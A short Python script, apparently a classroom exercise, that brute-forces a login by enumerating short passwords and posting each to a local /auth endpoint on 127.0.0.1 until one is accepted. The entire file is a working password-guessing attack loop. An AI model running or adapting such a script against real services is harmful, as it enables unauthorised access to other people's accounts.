import requests
import json

alphabet = '0123456789abcdefghjklmnoprstquvwxyz'
base = len(alphabet)

login = 'user'

length = 0
counter = 0

while True:
    password = ''
    number = counter # Текущая длина генерируемого пароля
    while number > 0:
        
        #(Целочисленное деление, остаток от деления) текущего числа на базу системы счисления (т.е. длину алфавита)
        number, remainder = divmod(number, base) 
        #print(counter, ' ', remainder, " ", number)
        #i = input()
        password = alphabet[remainder] + password
    
    # Дополняем длину пароля нулями в начале
    while len(password) < length: 
        password = alphabet[0] + password

    response = requests.post('http://127.0.0.1:5000/auth',
                            json={'login': login, 'password': password})
    #print('Password: ', password)
    
    if response.status_code == 200:
        print(f'SUCCESS! Login: {login} Password: {password}')
        break

    # встретили последний пароль для данной длины
    if alphabet[-1] * length == password: # Т.е. 'z' * длину = zzzz. Обр внимание на запись индекса!   
        length += 1
        counter = 0
    else:
        counter += 1

    if length == 4:
        break
